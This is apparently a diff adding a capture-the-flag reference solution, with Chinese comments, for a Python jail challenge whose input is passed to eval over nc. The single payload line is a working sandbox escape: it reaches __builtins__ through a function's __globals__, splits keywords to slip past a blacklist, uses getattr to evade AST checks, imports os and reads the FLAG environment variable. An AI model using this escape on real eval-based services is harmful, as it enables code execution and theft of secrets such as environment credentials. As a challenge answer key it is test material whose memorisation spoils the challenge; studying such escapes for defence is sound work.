@@ -1,0 +1,6 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# trap.__globals__ 即 challenge 模块命名空间；其中的 __builtins__
+# 是 module，再用 getattr 挖出真导入器与 getattr 本尊。
+# 全程拼接绕黑名单、getattr 调用绕 AST
+(T := getattr(trap, '__gl'+'obals__')['__bu'+'iltins__']) and getattr(T, 'getattr')(getattr(T, '__i'+'mport__')('o'+'s'), 'envi'+'ron')['F'+'LAG']
